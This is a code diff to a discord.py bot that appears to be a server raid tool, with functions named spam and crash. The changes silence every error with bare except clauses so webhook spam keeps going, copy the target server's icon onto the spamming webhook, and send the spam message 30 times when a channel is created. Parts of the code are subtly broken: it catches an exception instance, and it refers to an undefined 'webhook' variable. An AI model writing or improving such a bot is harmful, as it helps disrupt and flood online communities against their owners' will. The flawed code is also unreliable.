@@ -91,6 +91,8 @@ async def spm_hook(webhook):
         except RateLimited(retry_after=5):
             await asyncio.sleep(0.7)
             await webhook.send(txt)
+        except:
+            pass
         
 @bot.command()
 async def spam(ctx):
@@ -218,10 +220,15 @@ async def crash(ctx):
 @bot.event
 async def on_guild_channel_create(channel):
     if channel.name == channame:
-        web = await channel.create_webhook(name='ICSU')
+        web = await channel.create_webhook(name='ICSU', avatar= await channel.guild.icon.read())
         for b in range(30):
-            await asyncio.sleep(0.7)
-            await web.send(txt)
+            try:
+                await web.send(txt)
+            except RateLimited(retry_after=5):
+                await asyncio.sleep(0.7)
+                await webhook.send(txt)
+            except:
+                pass
     else:
          return
          
@@ -336,6 +343,7 @@ async def вайтлист(ctx, serv_id: int):
     
 
 bot.run(token, log_handler=None)
+
 
 
 
